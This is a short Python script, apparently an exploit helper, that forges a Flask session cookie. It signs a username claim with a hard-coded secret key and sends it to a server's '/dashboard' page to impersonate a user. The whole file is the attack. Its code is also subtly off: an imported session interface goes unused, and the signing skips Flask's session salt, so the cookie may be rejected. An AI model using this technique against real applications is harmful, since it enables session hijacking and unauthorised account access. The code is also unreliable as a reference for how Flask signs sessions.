from itsdangerous import URLSafeTimedSerializer
from flask.sessions import SecureCookieSessionInterface
import requests

# Replace 'your_app_secret_key_here' with your actual app.secret_key
app_secret_key = 'UnlimitedPower'

# Create a serializer using the app's secret key
serializer = URLSafeTimedSerializer(app_secret_key)

# Define the session data
session_data = {'username': 'desired_username'}

# Serialize and sign the session data
session_cookie_value = serializer.dumps(session_data)

# Create a session cookie jar
session_cookie = requests.cookies.RequestsCookieJar()
session_cookie.set('session', session_cookie_value, path='/', secure=False)

# Use the cookie in a GET request to the Flask server
response = requests.get('http://your-flask-server.com/dashboard', cookies=session_cookie)

# Print the response
print(response.text)